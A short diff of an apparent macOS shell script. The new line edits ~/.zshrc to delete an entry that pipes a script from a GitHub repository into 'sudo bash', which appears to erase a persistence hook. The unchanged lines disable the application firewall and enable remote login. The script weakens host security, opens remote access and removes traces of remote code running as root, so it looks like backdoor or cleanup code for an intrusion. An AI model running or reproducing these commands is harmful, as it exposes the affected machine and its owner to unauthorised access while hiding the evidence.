@@ -1,4 +1,5 @@
-sed -i '' '/alias exit=/d' ~/.zshrc
+sed -i '' '/curl -fsSL https:\/\/raw.githubusercontent.com\/in-jun\/jtest\/refs\/heads\/main\/root | sudo bash/d' ~/.zshrc
+
 /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off
 systemsetup -setremotelogin on
 
